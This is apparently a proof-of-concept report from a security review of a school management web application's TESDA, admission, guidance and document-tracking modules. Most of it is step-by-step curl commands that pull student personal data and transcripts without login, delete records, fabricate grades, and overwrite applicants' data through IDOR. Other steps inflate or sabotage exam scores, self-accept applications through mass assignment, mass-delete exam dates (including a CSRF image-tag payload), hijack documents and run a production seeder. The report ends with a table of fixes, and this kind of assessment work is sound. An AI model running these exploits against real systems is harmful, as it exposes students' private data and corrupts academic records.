# Auxiliary Modules — Proof of Concept
## TESDA · Admission · Guidance · Document Tracking · Library
**Date:** June 13, 2026  
**Purpose:** Demonstrate exploitability of findings from `OTHER_MODULES_CODE_REVIEW.md`  
**Prerequisites:** Network access to the target application. No credentials required for AUX-01, AUX-02, AUX-03, AUX-04. Valid session cookie required for AUX-05, AUX-06.

---

## AUX-01 — TESDA Portal: Full Data Access Without Authentication

### Setup
No authentication required. Replace `TARGET` with the school's domain.

### Step 1 — Enumerate All TESDA Student Records
```bash
curl -s "http://TARGET/tesda/getStudent" | python3 -m json.tool
```

**Expected Response:**
```json
[
  { "id": 1, "lname": "Dela Cruz", "fname": "Juan", "mname": "Santos",
    "address": "...", "contact": "09xxxxxxxxx", "batch_id": 3, ... },
  { "id": 2, "lname": "Reyes", "fname": "Maria", ... },
  ...
]
```
Full student roster with PII returned with no login.

### Step 2 — Print All Transcripts of Records (Mass Document Export)
```bash
curl -s -o all_tors.pdf "http://TARGET/tesda/printTORall"
file all_tors.pdf   # → all_tors.pdf: PDF document
```
A PDF containing all students' Transcripts of Records is downloaded without authentication.

### Step 3 — View Any Individual Student's Profile
```bash
# Using student ID from Step 1 enumeration
curl -s "http://TARGET/tesda/studentInformation/1"
```
Returns full PII for student ID 1.

### Step 4 — Delete a Student Record
```bash
curl -s -X DELETE "http://TARGET/tesda/delete-student/1"
```
Deletes TESDA student record without authentication.

### Step 5 — Submit Fabricated Grades
```bash
curl -s -X POST "http://TARGET/tesda/trainer/systemgrades/submit_grades" \
  -H "Content-Type: application/json" \
  -d '{"batch_id": 1, "student_id": 1, "grade": 99.99}'
```
Grade submission processed without authentication.

### Step 6 — Print National Certificate for Any Student
```bash
curl -s -o cert.pdf "http://TARGET/tesda/pdf/national_certificate?id=1"
file cert.pdf   # → cert.pdf: PDF document
```

**Root Cause (code):**
```php
// RouteServiceProvider.php
protected function mapTesdaRoutes()
{
    Route::prefix('tesda')
        ->middleware('web')    // ← authentication never enforced
        ->group(base_path('routes/tesda.php'));
}
```

---

## AUX-02 — Admission: IDOR on `update-student-info`

### Setup
No authentication required. Two browser tabs or two terminal sessions.

### Step 1 — Register a Legitimate Applicant (Victim)
```bash
curl -s -X POST "http://TARGET/admission/save-student-info" \
  -d "fname=Maria&lname=Santos&dob=2008-01-01&gender=female&age=16&\
      acadprog_id=1&contact_number=09123456789&gradelevel_id=7&\
      exam_setup_id=1&examdate_id=1"
```
**Response:**
```json
{ "status": "success", "message": "Successfully Registered!", "poolingnumber": "A3K9B2" }
```
Note the returned `poolingnumber` for the victim.

### Step 2 — Discover the Victim's Database ID

The victim's database ID is a sequential integer. Enumerate starting from 1:
```bash
curl -s -X POST "http://TARGET/admission/update-student-info" \
  -d "id=1&fname=Tampered&lname=Santos&dob=2008-01-01&gender=female&age=16&\
      acadprog_id=1&contact_number=09999999999&gradelevel_id=8&\
      exam_setup_id=1&examdate_id=2"
```

**Expected Response:**
```json
{ "status": "success", "message": "Successfully Updated!" }
```
The victim's name, contact number, grade level, and exam slot have been overwritten.

### Verification
Use the victim's pooling number to verify the data was changed:
```bash
curl -s "http://TARGET/admission/verify-pooling?poolingnumber=A3K9B2"
```
The returned data reflects the attacker-supplied values.

**Vulnerable code:**
```php
// AdmissionController.php — student_info_update()
$student = DB::table('admission_student_information')
    ->where('id', $request->id)     // ← id from caller, no session check
    ->where('deleted', 0)
    ->first();

DB::table('admission_student_information')
    ->where('id', $request->id)
    ->update($request->except(['_token', 'id']));   // ← no ownership verification
```

---

## AUX-03 — Admission: Exam Answer Tampering and Score Inflation

### Setup
No authentication required. Must know a target student's integer ID (obtainable from IDOR enumeration, or guessed from sequential IDs).

### Scenario A — Sabotage: Overwrite a Student's Answers with Wrong Answers

First, determine what questions exist by taking the exam yourself (or enumerating question IDs starting from 1). Then for each question in the target student's exam:

```bash
# Override answer for question ID 1, student ID 2 with a wrong answer
curl -s "http://TARGET/admission/save-answer?\
  id=1&studid=2&answer=wrong_answer&status=answered&points=0"
```

Repeat for all questions. The target student's exam answers are now all wrong.

### Scenario B — Score Inflation: Submit Correct Answers With Maximum Points

```bash
# Submit answer for question 1 with attacker-supplied points
curl -s "http://TARGET/admission/save-answer?\
  id=1&studid=2&answer=A&status=answered&points=100"
```

The server inserts `points=100` directly into the database without validating it against the answer key.

**Vulnerable code:**
```php
// AdmissionController.php — save_answer()
DB::table('admission_answer_history')
    ->updateOrInsert(
        ['questionid' => $request->id, 'studid' => $request->studid],
        [
            'answer' => $request->answer,
            'status' => $request->status,
            'points' => $request->points,   // ← attacker-supplied points accepted
        ]
    );
```
**Notice:** This is a GET route, so all answer values (including `answer` and `points`) appear in web server access logs as query strings.

---

## AUX-04 — Admission: Mass Assignment to Self-Accept Application

### Setup
No authentication required.

### Step 1 — Register With Attacker-Controlled Status

Inspect the `admission_student_information` table schema (visible by examining the controller). Include status/accepted fields in the registration request:

```bash
curl -s -X POST "http://TARGET/admission/save-student-info" \
  -d "fname=Test&lname=Attacker&dob=2008-01-01&gender=male&age=16&\
      acadprog_id=1&contact_number=09123456789&gradelevel_id=7&\
      exam_setup_id=1&examdate_id=1&\
      status=2&accepted=1&verified=1&deleted=0"
```

The `status=2`, `accepted=1`, and `verified=1` fields bypass the normal verification workflow because `$request->except(['_token'])` includes them all in the INSERT.

**Vulnerable code:**
```php
// AdmissionController.php — student_info_save()
$studentId = DB::table('admission_student_information')
    ->insertGetId(
        $request->except(['_token']) + [   // ← every POST field inserted
            'created_at' => now('Asia/Manila'),
            'poolingnumber' => $poolingnumber,
            'sy' => DB::table('sy')->where('isactive', 1)->value('id'),
        ]
    );
```

---

## AUX-05 — Guidance: Delete All Upcoming Exam Dates (Any Authenticated User)

### Setup
Requires a valid session cookie for any account (student, teacher, cashier, parent).

### Step 1 — Log In as a Student
Use browser DevTools or Burp Suite to capture the session cookie after student login.

### Step 2 — Enumerate Exam Dates (Optional)
```bash
curl -s "http://TARGET/guidance/get-examdate" \
  -H "Cookie: laravel_session=YOUR_SESSION_COOKIE"
```
Returns a list of scheduled exam dates with their IDs.

### Step 3 — Delete All Upcoming Exam Dates
```bash
for id in 1 2 3 4 5; do
  curl -s "http://TARGET/guidance/delete-examdate?id=$id" \
    -H "Cookie: laravel_session=YOUR_SESSION_COOKIE"
done
```
All scheduled exam dates are deleted. Incoming applicants can no longer book exam slots.

### Step 4 — CSRF Vector (No Interaction Required After Lure)
If a guidance officer can be tricked into loading a page containing:
```html
<img src="http://TARGET/guidance/delete-examdate?id=1">
<img src="http://TARGET/guidance/delete-examdate?id=2">
<img src="http://TARGET/guidance/delete-examdate?id=3">
```
The exam dates are silently deleted when the officer's browser loads the image tags.

---

## AUX-06 — Document Tracking: Intercept and Close Documents (Any Authenticated User)

### Setup
Requires a valid session cookie for any account.

### Step 1 — Enumerate Documents in the Tracking System
```bash
curl -s "http://TARGET/doctrack/get-all-docs" \
  -H "Cookie: laravel_session=YOUR_SESSION_COOKIE"
```
Returns all documents with their IDs (endpoint is named `getAllDocsForTruncate` — bulk access intended for admin use but accessible to any auth user).

### Step 2 — Close Documents You Did Not Create or Receive
```bash
curl -s "http://TARGET/doctrack/close-document?id=15" \
  -H "Cookie: laravel_session=YOUR_SESSION_COOKIE"
```
Document ID 15 is permanently closed regardless of workflow state.

### Step 3 — Forward Documents to Unintended Signatories
```bash
curl -s "http://TARGET/doctrack/forward-document?id=15&to_user_id=999" \
  -H "Cookie: laravel_session=YOUR_SESSION_COOKIE"
```
Forwards the document to an unintended signatory, disrupting the approval chain.

---

## BUG-AUX-02 — Production Database Seeder: Any Authenticated User

### Setup
Any valid session cookie.

```bash
curl -s "http://TARGET/tesda/seedtesda" \
  -H "Cookie: laravel_session=YOUR_SESSION_COOKIE"
```

**Expected Response:**
```
TesdaSeeder has been executed successfully!
```
The production database seeder has run, potentially overwriting live TESDA records with default seed data.

---

## Fix Summary

| Finding | One-Line Fix |
|---|---|
| AUX-01 | `->middleware(['web', 'auth'])` in `mapTesdaRoutes()` |
| AUX-02 | Bind update to session token, not `$request->id` |
| AUX-03 | Validate `studid` from session; compute `points` server-side |
| AUX-04 | Replace `$request->except(['_token'])` with explicit field array |
| AUX-05 | Add role middleware to guidance management routes |
| AUX-06 | Verify `auth()->user()->id === document->current_holder_id` |
| BUG-AUX-02 | Remove `GET /tesda/seedtesda` from production routes |
